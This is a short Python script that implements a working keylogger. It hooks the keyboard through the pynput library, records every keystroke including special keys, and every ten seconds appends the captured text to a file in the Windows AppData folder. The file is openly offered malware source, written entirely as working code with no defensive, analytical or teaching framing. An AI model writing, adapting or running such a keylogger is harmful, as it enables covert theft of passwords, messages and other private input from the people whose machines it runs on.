import pynput.keyboard
import threading
import os

keys = ""
PATH = os.environ['appdata'] + "\\keylogger.txt"

def process_keys(key):
    global keys
    try:
        keys = keys + str(key.char)
    except AttributeError:
        if key == key.space:
            keys += " "
        else:
            keys += " " + str(key)

def printkeys():
    global keys
    global PATH
    fin = open(PATH, 'a')
    fin.write(keys)
    keys = ""
    fin.close()
    timer = threading.Timer(10, printkeys)
    timer.start()

def start():
    listener = pynput.keyboard.Listener(on_press=process_keys)

    with listener:
        printkeys()
        listener.join()